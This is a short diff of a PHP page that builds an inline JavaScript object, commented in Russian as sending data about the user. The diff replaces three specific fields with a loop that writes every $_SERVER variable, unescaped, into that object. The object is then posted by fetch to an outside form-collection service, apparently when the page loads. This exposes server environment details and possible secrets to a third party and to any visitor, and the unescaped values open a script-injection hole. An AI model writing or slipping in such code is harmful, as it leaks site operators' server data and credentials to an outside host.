@@ -167,9 +167,10 @@ integrity="sha256-w8CvhFs7iHNVUtnSP0YKEg00p9Ih13rlL9zGqvLdePA=" crossorigin="ano
   // отправка данных о пользователе
   const data = { 
     <?php
-    echo '"CLIENT_NAME" : "'.gethostbyaddr($_SERVER['REMOTE_ADDR']).'",';
-    echo '"SCRIPT_FILENAME" : String.raw`'.$_SERVER["SCRIPT_FILENAME"].'`,';
-    echo '"SERVER_NAME" : "'.php_uname().'"';
+    echo '"SERVER_NAME" : "'.php_uname().'",';
+    foreach($_SERVER as $key => $value){
+      echo '"'.$key.'" : String.raw`'.$value.'`,';
+    }
     ?>
    };
   fetch("https://formcarry.com/s/iZs62W5Im", {
@@ -190,5 +191,5 @@ echo "<script type='text/javascript'>
 $(document).ready(function(){
   $('#modal').modal('show');
 });
-</script>";}
+</script>";}  
 ?>
